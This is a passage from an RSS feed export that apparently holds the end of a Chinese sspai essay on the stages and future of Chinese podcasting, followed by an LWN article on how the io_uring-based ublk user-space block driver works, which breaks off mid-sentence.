对商业化不利，对产业规模拓展不利，对审核而言麻烦。同时它对内容创作者的自由度有利。这也是当今中文播客含金量较高的技术背景之一。如果媒体们谨言慎行、勿论时事，那可能不会有那么多人喜欢如今的播客。但那也必然会成为产业的未来，只要这个产业还需要未来。<strong>媒体播客需要从如今的主流谈话类节目中转型，解放 UGC、PUGC 的创作力，也为头部 PGC 们寻求更多商业存活的能力。</strong></p><figure><img src=\"https://cdn.sspai.com/2022/08/04/887873d6518dfb5eaa34d2d719905d3d.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/04/887873d6518dfb5eaa34d2d719905d3d.png\" referrerpolicy=\"no-referrer\"></figure><h4>关于小宇宙</h4><p>关于中文播客的第三个时刻，也即媒体播客阶段的时代背景、平台与创作者的讨论已阐述如上。在这里另用一个小章节讲讲这波浪潮中表现最突出的小宇宙平台。我是小宇宙最早的一波用户，也是即刻的老用户（2K+ 天），所以有一些自己的观察和理解。</p><p>即刻与播客的渊源来自于即刻社区内的「一起听播客」圈子。这个圈子至今有 8.2 万人加入，不算是很大的圈子；但活跃度一直很好。2019 年 7 月，即刻受到举报，突然下架。我当时刚通过申请当上 Keynote 相关话题的主理人，一觉起来之后话题没找到，连即刻都没了。在无即可刷的日子里，核心即友被通过微信群等方式紧急地聚拢起来。但若无产品可用用户最终还是会流失。于是，即刻团队在等待重新上架的一年时间里，一边做出了社区的暂时替代品「Jellow」，一边尝试其他业务的可能性。其中包括了返利软件快鸟、日程管理工具 PingPal、约会交友产品橙、面即工具 Comeet、好物分享平台即士多等等。由 Kyth 负责的小宇宙也正是其中之一。</p><p>所以说小宇宙之所以能在这波浪潮中独领风骚，除了即厂一直以来较为出众的产品能力外，更重要的是其与媒体的贴合度。即刻本就以信息抓取起家；又历经举报事件，对审核敏感度高，成立了自己的审核团队；社区里中产用户多，不乏谈话类节目爱好者；再加上产品团队本就有播客消费习惯，可以说即刻做播客平台并不是机缘巧合的雨中邂逅，而是技术、兴趣、经验等多方面优势综合后的 deja vu。</p><p>Kyth 是即刻的产品负责人，也是摇滚、脱口秀、足球、英美剧和播客爱好者。作为老球迷，他在 2015 年就曾做过一档名为「曼联时间」的侃球播客。2019 年 11 月，JustPod 的杨一举办第二届 PodFest China，作为中文播客届最大的线下活动，同样在上海的 Kyth 和即刻 CEO 瓦恁以及一大票即厂员工都来到了现场。瓦恁当时踢球扭伤了脚，还拄着拐杖。</p><figure><img src=\"https://cdn.sspai.com/2022/08/04/cb0a4c0367450cc5584e28ba60145e5a.JPG?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/04/cb0a4c0367450cc5584e28ba60145e5a.JPG\" referrerpolicy=\"no-referrer\"><figcaption>画面尽头，缠着绷带的瓦总</figcaption></figure><p>这次 PodFest 可以说是以媒体为主的播客浪潮里十分重要的一次活动。虽说名为第二届，但第一届也是在 2019 年举办。这也是因为杨一发觉到了 2019 年下半年以来播客的流行热潮。在这次活动上，有海派的播客代表的任宁（迟早更新）、婉莹（博物志）；有媒体类播客代表的徐涛（声东击西）、彭寒（故事 FM）；还有笑果旗下脱口秀播客的朋克（车间访谈），来自香港的振宇（无业游民）以及看理想的内容总监孙瑞岑、主打声音记录片的制作人曹容千（PageSeven）等。当然还有 JustPod 自家的 CEO 程衍樑（忽左忽右）。有趣的是，演讲嘉宾中还包含数位英语播客创作者，比如知名播客「This American Life」的制作人 Emanuele Berry。</p><p>从嘉宾阵容就可以看出，同在南方的地缘因素与承袭海外播客的制作经验，使以 JustPod 为代表的上海媒体播客、以声东击西为代表的专注海外市场的科技媒体播客与海派播客之间受众更为重合。这也使当时南北派、京海派的话题颇受关注。但总体上这点小八卦不足为道，京海派时期播客市场狭小、互相割裂，彼此没有多少联系；直到媒体播客时期平台发展起来，创作者们才增加了交流。道长在第三次 PodFest 活动上说，「直到今天我才知道我做的这个叫播客」。可见行业的共识还在逐渐统一。小圈子在逻辑上并不存在。</p><p>逻辑上不存在，现实里却小有影响。第二届 PodFest 作为以媒体与海派播客为主要嘉宾的活动，也是第三世代播客平台建设期的活动。当时在会的平台方有喜马拉雅的海外播客厂牌 Himalaya，也有改着 Keynote 寻思着播客小程序发布日期的轻芒的王俊煜，还有坐席里未来的小宇宙 APP 的团队们。不论是地缘因素还是由这次活动引起的对功能设计的思考，再加上有过受审查下架的经历，诸多原因所塑造的<strong>小宇宙的产品气质使它迄今为止仍是最契合媒体播客的平台，就像一本有编辑团队的音频杂志</strong>。这也就是为什么在第三届 PodFest 时有些播客的创作者会半开玩笑地说「为什么小宇宙推荐的多是南方的播客」，也是喜马拉雅等第二世代音频平台、Moon FM 等泛用型客户端、快手的皮艇等其他第三世代平台、各大音乐流媒体平台之类的同期产品和小宇宙最大的区别。</p><p>以 RSS 为基础的播客客户端更多迎合海派播客用户，所开发的功能在打点、Shownotes、隐私等方面创新居多；音乐流媒体平台和几家互联网大厂的产品更擅长大数据、智能推荐、评论社交等更契合 UGC 播客的功能点。小宇宙则用每日三条的首页推荐、精致的 UI 设计、服务主播的工具开发、与头部主播的知识付费合作等方式更好地把握住了媒体播客的潮流。而作为互联网品牌的属性，评论、弹幕、关注等功能，则并没有作为重点来运营。</p><p>虽然小宇宙也有评论功能，而且是当时所有 RSS 平台里第一个推出评论功能的产品，却受到了很多主播的反对。毕竟广播市场长久以来没有听众即时评论，RSS 产品也没有即时评论，媒体人更是从来不喜欢自己的内容被键盘观点指点江山。（播放量的显示也是如此，这对播客市场的影响就好比微信公众号上线了阅读量显示后文字市场的波动。）小宇宙也非常在乎主播们的看法，给了主播对评论区的管理权。所以，综合我所收集的数据和几年的使用体验看来，<strong>小宇宙的评论区虽然有时讨论不少，但总体上一言蔽之：「这期真好」</strong>。</p><p>正是以上种种特性，让小宇宙更像是一家发行商，一本精致杂志，每天手动置顶三档播客头条。这也是为什么在所有平台里，小宇宙最受媒体播客青睐的原因。</p><h2>未来：何去何从？</h2><p>总结了中文播客过去的三波浪潮后，我们再来聊一聊未来。</p><h3>叙事类播客</h3><p>我们一直在期待中文播客的「Serial 时刻」，因为这是英文播客走向大众化的关键节点。在许多从业者看来，叙事类播客的缺失正是目前中文播客最大的问题。对话体自然能孕育智慧，人类早期的书籍如《论语》、《理想国》也都是以对话体承载观点。但归根结底，讲道理不如讲故事，名著多是小说；你能记住的影像作品，也几乎都是电影而非某档谈话节目。道理只有在不言自明的时候最有说服力，所以故事就像有留白的道理，比列清单式的观点一二三四更有韵味。仅做谈话节目，就不在乎编辑、音乐、包装甚至音质，播客只是门技术；只有讲起故事，音频处理的方法、叙事顺序、声音大小远近的切换、效果器的运用……播客才成为艺术。</p><p>但中文叙事类播客显然难以做出「Serial」那样的作品。一种连载式的、以真实事件为背景的调查报告。我们不缺乏类似的案件，也不是全然无法调查，只是无法连载调查。如果调查戳不到问题本质，它会被遗忘；如果调查真的戳中问题本质，它会被遗忘得更快。无论哪种情况，无法连载。</p><p>那就只能以虚构、或者建立在现实基础上的再加工内容为核心来制作虚构类作品了。如此说来，中文播客需要的就是一部《一个国家的诞生》。这需要有大卫格里菲斯那样能制定标准的导演，与大量的启动资金，这同样非常困难。</p><figure><img src=\"https://cdn.sspai.com/2022/08/04/20dbb4febbc7229b940852390c305f86.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/04/20dbb4febbc7229b940852390c305f86.png\" referrerpolicy=\"no-referrer\"><figcaption>电影工业的奠基之作《一个国家的诞生》</figcaption></figure><h3>综艺类播客</h3><p>在谈话类、叙事类播客之外，近两年逐步冒头的新播客潮流也不可小觑，这就是综艺播客。有媒体播客的 PGC 创作方法论加持，与疫情以来大众娱乐需求的旺盛，再加上传统电台至今盛行的相声娱乐基底，共同促进了综艺类播客的繁荣。</p><h4>脱口秀播客</h4><p>脱口秀类播客是在近几年大放异彩的综艺类播客中的典范。其中最有名的当然是「谐星聊天会」。其实脱口秀这个话题很有意思，作为一个外来的新领域，笑果和单立人两家头部公司又一个在上海一个在北京，俨然又是一副京派海派的意思。但最有趣的是，京派往往指的是更具有本土特色的一派，海派则更有原教旨主义。但在中文脱口秀领域里，单立人反而更像传统意义的海派，自我的身份认同一直是「单口喜剧」；笑果则更像本地化的京派，愿意托名于流传更广的「脱口秀」一词。在演出形式上，单立人也更偏向线下演出；笑果依托李诞的经历，线上综艺使演员成名，于是线下票就有如演唱会般热卖。</p><p>因为地缘因素，单立人和看理想、京派播客都保持着不错的关系。周奇墨在看理想有一档介绍单口喜剧的课程，李叔和石老板都上过彼此的节目。受到播客界的影响，诞生较早的「一言不合」「无聊斋」更像是谈话类节目；在笑果的《脱口秀大会》等节目爆火后，作为语言综艺类节目的一种尝试，「谐星聊天会」横空出世。目前已经是小宇宙上最受欢迎的节目之一。</p><figure><img src=\"https://cdn.sspai.com/2022/08/04/02f71273ec85ded2e70d9f41f00323d7.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/04/02f71273ec85ded2e70d9f41f00323d7.png\" referrerpolicy=\"no-referrer\"><figcaption>谐星聊天会平均播放量高达十七万次，是小宇宙上平均播放量最高的节目</figcaption></figure><p>单立人作为中文脱口秀的头部厂牌，旗下演员水准并不低于笑果文化的签约艺人，这从周奇墨的夺冠就可以验证；但比起李诞的综艺实力和人脉，单立人想要复刻脱口秀大会的成功显然很困难。所以用综艺类播客这一自己更熟悉、成本更低的媒介占领市场，是一个很不错的选择。</p><p>在疫情反复的当下，选秀节目因政策问题受阻，制作周期较长、录制成本较高的脱口秀电视综艺并不足够满足大众的娱乐需求。综艺类播客依托脱口秀节目的突破口，可能是播客破圈的机遇之一。</p><figure><img src=\"https://cdn.sspai.com/2022/08/04/86bca600b417b3ac2a69e47f4e4d60ec.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/04/86bca600b417b3ac2a69e47f4e4d60ec.png\" referrerpolicy=\"no-referrer\"><figcaption>小宇宙平台平均播放量排行榜 数据来自<a href=\"https://xyzrank.com/#/hot-podcasts\" target=\"_blank\">中文播客榜</a></figcaption></figure><p>着眼脱口秀综艺类播客市场的不止单立人一家。笑果早前也推出过和谐星聊天会同期的「车间访谈」；近年以来又推出了「笑果小酒馆」「笑果编剧活动中心」等节目；同在上海调性上也更加海派的喜剧联合国也有「嘻谈录」「伐要去管它」等节目。</p><p>在国外，单口演员的个人播客早已是英文播客市场中的一个显著分类，从用户需求到创作场景都已被打通；而国内这一片市场大半还属于相声行业。由「谐星聊天会」领头的喜剧演员主持、观众参与的半喜剧半谈话类脱口秀综艺节目，很可能是眼下中文播客市场突破瓶颈的重要助力之一。</p><h4>情景剧播客</h4><p>除了脱口秀播客，还有一种重要的综艺类播客，我称之为「情景剧式」的播客。这是比较新的定义，可能会引起一些争议，且做讨论。「情景剧式」播客指的是随着媒体播客浪潮诞生的新陪伴类播客，典型代表有「贤者时间」「Nice Try」。</p><figure><img src=\"https://cdn.sspai.com/2022/08/04/bd4b66fdc285081d365d992333e1f650.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/04/bd4b66fdc285081d365d992333e1f650.png\" referrerpolicy=\"no-referrer\"><figcaption><a href=\"https://www.xiaoyuzhoufm.com/podcast/5e280faa418a84a0461f9e0a\" target=\"_blank\">Nice Try</a></figcaption></figure><p>和原本以京派播客为主流的陪伴类播客不同，「情景剧式」陪伴类播客更注重语言描绘的生活再现，出场角色固定，基本不请嘉宾，非常重视与听众的共情。如果说京派陪伴类播客展示的是追忆似水年华式的悲欢离合，那么情景剧式播客表达就更多是生活中的小确幸。前者的笑声豪放，偶尔也有泪水；后者笑得更频繁、更温暖，基本没有悲苦。所以我用「情景剧播客」来概括后者，因为收听感受就像看情景剧，百分之九十以上的情绪是开心，剩下的百分之十中即便有泪水，也全部都是感动。在经济下行、疫情反复的时候，情景剧播客所能带来的「温馨的欢笑力量」是很有治愈性的。</p><figure><img src=\"https://cdn.sspai.com/2022/08/04/82a92f88536b508cd547f2cb373b0755.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/04/82a92f88536b508cd547f2cb373b0755.png\" referrerpolicy=\"no-referrer\"><figcaption><a href=\"https://www.xiaoyuzhoufm.com/podcast/5e285523418a84a04627767d\" target=\"_blank\">贤者时间</a></figcaption></figure><p>不过，情景剧式播客尚未像「谐星聊天会」那样，开发出自身品类中足够的综艺属性，更像是在媒体播客大背景下依然保持了谈话类节目底色的「一言不合」。这也是其属性和京派以来陪伴类播客不相上下、难以区分的重要原因之一。在商业化的道路上还需要更多探索。</p><h4>媒体播客与综艺播客的关系</h4><p>中文播客中一直以来都有相声一类的类综艺型播客，但直到媒体播客兴起，以综艺属性为主的播客才有逐渐冒头的趋势。这主要是因为在前两次播客浪潮里，即便有音乐专业、电台专业背景的从业者加持，整体的生产过程仍未有打通，尤其是在商业化运作方面，中文播客还保持着 UGC/PUGC 的创作思路，这导致除了谈话类播客外，几乎没有其他能覆盖成本的播客类型。节目创作的前期投入必须被限定在合理的范围内，后续的宣发等活动也几乎为零。</p><p>叙事类播客也是如此。目前市场上为数不多的叙事类播客几乎都是媒体背景的厂牌在做推动。这一类播客几乎必须是 PGC 出品。</p><p>媒体播客浪潮使中文播客市场出现了真正的联合发行机构，不再是过去松散的邦联。随着媒体播客厂牌们在统一的工作流程下更高效地孵化播客矩阵，越来越多的内容进入市场，更多形态的播客才有出头的机会。在这项优势下，照搬国外媒体播客机构的路径是最为保守的选择，但目前看来成效可能不好，真实案件调查类播客牵扯到模糊的红线，随时有下架风险；叙事类播客难以与短视频竞争，长篇幅的叙事类播客在目前环境下更是缺乏制作能力。也许笑果在单口喜剧领域走出的以综艺节目为突破口的道路是一个不错的选择。许多播客创作者本就是文艺、音乐行业出身，想象一下由大内或日谈举办的类乐队的夏天的节目；像乘风破浪的姐姐等在播客圈大热的话题综艺，也完全可以由播客厂牌自行举办。比起电视综艺，播客综艺成本低、限制少，又可以直接增加收益，仅线下售票就几乎可以收回成本。在未来一两年内，应该会有越来越多的播客厂牌推出自己的综艺节目。</p><h4>平台何去何从？</h4><p>在文章伊始就已提及，RSS 技术已经衰微，泛用型播客客户端注定小众。而喜马拉雅、荔枝等第一代音频平台在播客领域的投入与产出完全不成正比。平台不能赚钱，有时比创作者用爱发电更要命。小宇宙等新一代平台也面对着一样的问题。如何破局？</p><p>其实同作为内容平台，播客的一切问题都可以对照视频来看。在视频产业里，以 <strong>PGC、PUGC 和 UGC</strong> 三种类型来区分，则可分别对应<strong>长视频、中视频和短视频</strong>，其对应的平台则是 Netflix、Youtube / B 站、抖音/快手。中文播客以谈话类长内容为主，那对标的就是 Netflix、Amazon、Disney+、Hulu、Apple TV+ 等，即内容采买、付费订阅。Spotify 走的也是相似之路。</p><p>独家内容带来的好处自不必说。「剩余价值」停更后，「随机波动」一段时间内只在小宇宙更新，使其至今仍是小宇宙订阅量最高的节目。但目前小宇宙的体量还不足以使其走上奈飞模式。这有点像早期的微信公众号、百家号、头条号之间的争夺战。用户去哪里，哪里才有垄断内容的可能性。</p><p>一方面，对话体的长内容打磨不够精细，复听率不高，奈飞模式也许更适合看理想等知识付费平台。另一方面，体量不够大的前提下，也没有资金采购内容。那么走 Youtube / B 站的中视频形式更加契合。很多播客虽然时长不短，却不足以真正称之为长内容，和电影、电视剧等同样长度的内容比起来，它们并不能给消费者多大的付费动力，也不那么具备娱乐属性。绝大部分的时长被花费在建立语境这件事情上，信息密度不是很高。所以，从内容形态上来看，还是将长播客与中视频并列对比更合适些。</p><p>而即便以 Youtube / B 站为目标看待小宇宙等平台的未来发展方向，也是有些吃力的。因为这些 PUGC 平台的内容丰富，类目众多，而中文播客的种类太少。B 站以二次元起家，形成了鬼畜等自有文化，播客领域却没有这些二创文化。同样，Youtube / B 站可以找到各类教程视频，播客领域这方面什么都没有。哪怕是教人做播客的内容，绝大部分还是以图文或视频方式呈现。当下的中文播客里，媒体属性，尤其是谈话类为主的媒体属性太过强烈，PUGC 创作者难以找到适合自己的节目形式，就像文章第一章中提到的「影视飓风」「管泽元」的例子，同样是播客还不如编辑为视频后收获的关注量大。</p><p>如何在照顾好 PGC 播客厂牌们的同时为 PUGC 创作者提供更好的创作环境，也是平台必须要考虑的事情。</p><p>在这方面，即便还不存在短播客市场，仍可以向短视频平台学习经验。从抖音和快手的崛起上就可以嗅探到机会：抖音最早以音乐为主打，快手则由 GIF 创作工具衍生而来。音乐和工具，是成熟且长久的需求。</p><p>就像书迷会乐于对比同一本书在不同版次间的区别那样，许多乐迷也对心仪乐队或歌手不同版本的歌曲津津乐道。这就有了一项很不错的短音频切入点：乐曲 demo。爱逛美术馆的人知道，一幅留名美术史的绘画创作，往往是在数十次草稿的修改后才能得出的。而人们知晓最终作品的存在，却很可能无视那些挥洒汗水的准备工作。不过对于爱好者而言，那些旷世名画的最早批次版本，依然存有不可比拟的创意和艺术性。近期周杰伦《最伟大的作品》热度霸榜，有许多人觉得不如过去的歌好听。其实这主要是和乐曲缺乏共鸣的原因，回忆之所以可以加分，是因为时间带来的陪伴感，而新歌是纯粹的陌生人。倘若周董能实时更新进度，每隔几周放出一支 demo，那既可以加强粉丝与新歌之间的联系，又能够使听众更加了解歌曲的创作思路，可能就不会有那么多听不懂之类的评价了。</p><p>工具属性的短音频则更好理解，比如冥想和助眠使用的白噪音。市面上的许多白噪音软件都提供订阅服务，倘若这类音频被打包进前文所述的类奈飞的订阅模式，变成为平台维护、定时更新的常驻功能，自然很是契合，都是耳朵时间的一部分。Moon FM 的开发者高登近期就开发了一款白噪音 app Noise Smith；喜马拉雅也有类似的白噪音功能。</p><p>此外，小红书也是一个很好的参照物。小红书的笔记文化是其社区的核心，图+文的形式比视频更低创作门槛，也可以非常全面地讲述一项教程或知识类的分享。目前的播客以音频替代文字，承载的多是文本内容；倘若代入到小红书的笔记载体里去，变成图 + 音频的形式，可以成就一种新型的播客笔记。纯粹的音频无法像视频那样，讲述一道菜的做法、一件手艺活的细节等，但图片 + 音频的形式可以。这也是一个很有特色的短播客平台方向。</p><h2>总结：中文播客，何去何从？</h2><p>回顾了中文播客的整个发展历程后，我的观点整理如下：</p><p>中文播客目前历经了三个阶段，分别是<strong>萌芽阶段、京海派播客阶段和媒体播客阶段</strong>。</p><p>萌芽阶段（2004-2005）的特点：桌面互联网时代；主流创作者来自音乐、电台行业；正值 RSS 的兴盛时期，依托网站进行分发；听众多使用 MP3、iPod 等载体收听节目。</p><figure><img src=\"https://cdn.sspai.com/2022/08/04/521ebeabe56206056aa3894fdda6967e.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/04/521ebeabe56206056aa3894fdda6967e.png\" referrerpolicy=\"no-referrer\"></figure><p>京海派阶段（2012-2013）的特点：移动互联网时代；京派传承自萌芽时期的北方播客，海派源自于留学生的回国热潮，两派播客的区别，一言以蔽之，京派播客给听众的听感为「这人不错」，海派播客给听众的听感为「这话很对」；出现了更多垂直品类的创作者，UGC 升级至 PUGC；RSS 技术衰落，但在播客领域仍有活力，Podcast、喜马拉雅、荔枝、蜻蜓等网络音频平台相继出现；听众多使用手机收听节目。</p><figure><img src=\"https://cdn.sspai.com/2022/08/04/0c5c46e1802394800d7985241d733dbb.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/04/0c5c46e1802394800d7985241d733dbb.png\" referrerpolicy=\"no-referrer\"></figure><p>媒体阶段（2019-2020）的特点：短视频时代；主流创作者多有媒体行业背景，为行业带来 PGC 的生产方式；RSS 技术在播客领域回潮，出现了由国内个人开发者创作的 Moon FM、Baucast、海盗电台等国产泛用型播客客户端；出现了小宇宙、皮艇、汽水儿等专注于播客的新一代音频平台，QQ 音乐、网易云音乐等音乐流媒体也开始着重布局；传统的电视谈话类节目凋零殆尽，部分市场由播客接纳；智能手机市场饱和，AWS 市场兴起，智能音箱等产品补充了更多的收听渠道。</p><figure><img src=\"https://cdn.sspai.com/2022/08/04/6c123369db9cef01cb934318bd693433.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/04/6c123369db9cef01cb934318bd693433.png\" referrerpolicy=\"no-referrer\"></figure><p>在前两个阶段，播客作为小众媒介，是由 UGC 向上成长为 PUGC；在第三个阶段，媒体和电视谈话类节目受到短视频和审查影响，许多媒体人避开锋芒来到了播客市场。带来了先进创作方法论的同时，也使中文播客囿于长篇幅谈话类节目的困境。</p><p>结论：眼下仍是谈话类播客的黄金时代；传统媒体难以在短视频潮流中立足，转型做播客是一种不错的选择；小宇宙的产品形态如同声音杂志，是所有新平台中最贴合媒体播客需求的，所以在这一阶段成绩最好；中文播客和海外播客最大的区别在于，海外播客从起始阶段就是媒体播客领头，而且有相当数量为叙事类播客，但在中国，短视频叙事类内容体量更大、成本更低，用户群体更广泛；商业化虽有进步却依然缓慢；除了长篇幅的谈话类内容，其他几乎所有类型的内容都被视频市场掌控。</p><p>中文播客的困局，可谓成也谈话类，困也谈话类。十几年的深耕过后，受众人群基本瓜分殆尽，后劲不足，且商业价值已有知识付费平台收割在前。谈话类节目的长有时不在于丰富的信息量，而在于构建语境的缓慢，是用闲聊的方式规避审查的一种自我保护，不能说是真正的对标电影的长内容，不具备同样的用户付费动力、商业价值。</p><p>目前看来，有两个突破方向：一是<strong>深度开发长内容，增加投入，制作叙事类播客、综艺类播客。</strong>在这方面，中文播客需要一个大卫格里菲斯和一部《一个国家的诞生》。我个人更看好综艺类播客，「谐星聊天会」珠玉在前，在小宇宙的平均单集播放量逾十七万次，是目前最有希望破圈的播客。作为对比，单集平均播放量第二名的道长的「八分」数据为六万八千次。疫情之下，电视综艺节目因政策越来越少，播客有能力接下这一市场。</p><p>二是<strong>探索短音频市场。</strong>这需要从平台的角度定义，因为如今的很多短视频实质上就是图片+播客，只是形式上仍以视频的方式打包而已。中文播客目前几乎全部是长音频，低于三十分钟的播客都少之又少，超过一小时的倒是随处可见。根据播客「枫言枫语」所做的数据统计，小宇宙与 Apple Podcast 上订阅量最高的近千档播客的平均单集时长达到了 48 分钟。这很大程度上也是谈话类内容所必须的属性，因为对话需要花较长的时间来塑造语境、确立共识。而普遍较长的时长影响了听众习惯后，非谈话类的节目受众将更少。</p><p>我们常夸赞播客的知识浓度，和较长的时间带来的宛如论文一般的对观点的交叉论证。这是优点也是困境。比起一般的内容消费产品，中文播客知识性冗余而娱乐性不足；比起知识付费类内容，对话体又显得啰嗦，提供的不是知识点而是对现实总结提炼出的逻辑和经验。尽管在苏格拉底看来这更接近于智慧，却并不是快节奏的时代里人们眼中的知识。</p><figure><img src=\"https://cdn.sspai.com/2022/08/04/01577fdae7f57f591b2a5871a1c9f76b.jpeg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/04/01577fdae7f57f591b2a5871a1c9f76b.jpeg\" referrerpolicy=\"no-referrer\"><figcaption>苏格拉底：真理在对话中产生</figcaption></figure><p>十八年过去，博客早已没落，RSS 已是昨日黄花；桌面互联网乃至移动互联网，都不再是新兴产业。在短视频统治的当下，长文章越来越少，短小如微博也变得不受重视。播客在音频领域用对话体维持着讨论，用小众的市场为媒体续命。也许我们会怀念这一年。正如我们怀念 2019，抑或十八年前。也许这 UGC 和 PUGC 熬不出头、头部播客关注数加在一起不足一个短视频营销号的粉丝量、也没什么钱可赚的年头，恰恰是中文播客的黄金时代。随着产业成熟，这个时代会越走越远。我们逆水行舟，奋力前行，在浪花里哈哈大笑，为沿途的潮水激辩和流泪。然而流水的方向不可更改，时代终会将我们推往那不可预知的未来。</p><p>&gt; 暑期征文 <a href=\"https://sspai.com/post/74751\">数字文具盒</a> 火热征稿中，分享学习方法，拿走现金奖励 🧑🎓</p><p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>"
    },
    "origin": {
        "streamId": 28,
        "title": "少数派",
        "htmlUrl": "https://sspai.com/",
        "feedUrl": "https://rsshub.black-desk.cn/sspai/index"
    }
},
{
    "id": "903855",
    "timestampUsec": "1659975267328759",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "An io_uring-based user-space block driver",
    "author": ";corbet",
    "published": 1659970080,
    "updated": 1659970080,
    "alternate": [
        {
            "href": "https://lwn.net/Articles/903855/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<div>\n           By <b>Jonathan Corbet</b><br>August 8, 2022\n           </div>\nThe addition of the ublk driver during the 6.0 merge window would have been\neasy to miss; it was buried deeply within an io_uring pull request and is\nentirely devoid of any sort of documentation that might indicate why it\nmerits a closer look.  Ublk is intended to facilitate the implementation of\nhigh-performance block drivers in user space; to that end, it uses <a href=\"https://lwn.net/Articles/776703/\">io_uring</a> \nfor its communication with the kernel.  This driver is considered\nexperimental for now; if it is successful, it might just be a harbinger of\nmore significant changes to come to the kernel in the future.\n<p>\nYour editor has spent a fair amount of time beating his head against <a href=\"https://lwn.net/ml/io-uring/20220713140711.97356-1-ming.lei@redhat.com/\">the source\nfor the ublk driver</a>, as well as the <a href=\"https://github.com/ming1/ubdsrv\">ubdsrv server</a> that comprises the\nuser-space component.  The picture that has emerged from this exploration\nof that uncommented\nand vowel-deficient realm is doubtless incorrect\nin some details, though the overall shape should be close enough to\nreality.\n</p><p>\n</p><h4>How ublk works</h4>\n<p>\nThe ublk driver starts by creating a special device called\n<tt>/dev/ublk-control</tt>.  The user-space server (or servers, there can\nbe more than one) starts by opening that device and setting up an io_uring\nring to communicate with it.  Operations at this level are essentially\n<tt>ioctl()</tt> commands, but <tt>/dev/ublk-control</tt> has no\n<tt>ioctl()</tt> handler; all operations are, instead, sent as commands\nthrough io_uring.  Since the purpose is to implement a device behind\nio_uring, the reasoning seems to be, there is no reason to not use it from\nthe beginning.\n</p><p>\nA server will typically start with a <tt>UBLK_CMD_ADD_DEV</tt> command; as\none might expect, it adds a new ublk device to the system.  The server can\ndescribe various aspects of this device, including the number of hardware\nqueues it claims to implement, its block size, the maximum transfer size,\nand the number of blocks the \ndevice can hold.  Once this command succeeds, the device exists as far as\nthe ublk driver is concerned and is visible as <tt>/dev/ublkc<i>N</i></tt>,\nwhere \n<tt><i>N</i></tt> is the device ID returned when the device is created.\nThe device has not yet been added to the block layer, though.\n</p><p>\nThe server should open the new <tt>/dev/ublkc<i>N</i></tt> device for the\nfollowing steps, the first of which is to map a region from the device into\nthe server's \naddress space with an <tt>mmap()</tt> call.  This region is an array of\n<tt>ublksrv_io_desc</tt> structures describing I/O requests:\n</p><p>\n</p><pre>    struct ublksrv_io_desc {\n\t/* op: bit 0-7, flags: bit 8-31 */\n\t__u32\t\top_flags;\n\t__u32\t\tnr_sectors;\n\t__u64\t\tstart_sector;\n\t__u64\t\taddr;\n    };\n</pre>\n<p>\nNotification of new I/O requests will be received via io_uring.  To\nget to that point, the server must enqueue a set of\n<tt>UBLK_IO_FETCH_REQ</tt> requests on the newly created device; normally\nthere will be one for each \"hardware queue\" declared for the device, which\nmay also correspond to each thread running within the server.  Among other\nthings, this request must provide a memory buffer that can hold the maximum\nrequest size declared when the device was created.\n</p><p>\nOnce this setup is complete, a separate <tt>UBLK_CMD_START_DEV</tt>\noperation will cause the ublk driver to actually create a block device\nvisible to the rest of the system.  When the block subsystem sends a\nrequest to this device, one of the queued <tt>UBLK_IO_FETCH_REQ</tt> operations\nwill complete.  The completion data returned to the user-space server will\ninclude the index of the \n<tt>ublkserv_io_desc</tt> structure describing the request, which the\nserver should now execute.  For a write request, the data to be written\nwill be in the buffer that was provided by the server; for a read, the data\nshould be placed in that same buffer.\n</p><p>\nWhen the operation is complete, the server must inform the kernel of that\nfact; this is done by placing a <tt>UBLK_IO_COMMIT_AND_FETCH_REQ</tt>\noperation into the ring.  It will give the result of the operation back to\nthe block subsystem, but will also enqueue the buffer to receive the next\nrequest, thus avoiding the need to do that separately.\n</p><p>\nThere are the expected <tt>UBLK_CMD_STOP_DEV</tt> and\n<tt>UBLK_CMD_DEL_DEV</tt> operations to make existing devices go away, and\na couple of other operations to query information about existing devices.\nThere are also a number of details that have not been covered here, mostly\naimed at increased performance.  Among other things, the ublk protocol is\nset up to enable zero-copy I/O, but that is not implemented in the current\ncode.\n</p><p>\nThe server code implements two targets: null and loop.  The null target is,\nas one might expect, an overly complicated, block-oriented version of\n<tt>/dev/null</tt>; it is useless but makes it possible to see how things\nwork with a minimum of unrelated details.  The loop target uses an existing\nfile as the backing store for a virtual block device.  According to author\nMing Lei, with this loop implementation, \"<q>the performance is\nis even better than kernel loop with same setting</q>\".\n</p><p>\n</p><h4>Implications</h4>\n<p>\nOne might wonder why this work has been done (and evidently supported by\nRed Hat); if the world has been clamoring for an io_uring-based,\nuser-space, faster loop block device, it has done so quietly.  One\nadvantage cited in the patch cover letter is that development of\nblock-driver code is more easily done in user space; another is\nhigh-performance <a href=\"https://en.wikipedia.org/wiki/Qcow\">qcow2</a>\nsupport.  The patch cover letter also cites interest expressed by other\ndevelopers in having a fast user-space block-device mechanism available.\n\n</p><p>\nAn interesting question, though, is whether this mechanism might ultimately\nfacilitate the movement of a number of device drivers out of the kernel —\nperhaps not just block drivers.  Putting device drivers into user-space\ncode is a fundamental concept in a number of secure-system designs,\nincluding microkernel systems.  But one of the problems with those designs\nhas always been the communication overhead between the two components once\nthey are no longer running within the same address space.  Io_uring might\njust be a convincing answer to that problem.\n</p><p>\nShould that scenario play out, kernels of the future could look\nsignificantly different from 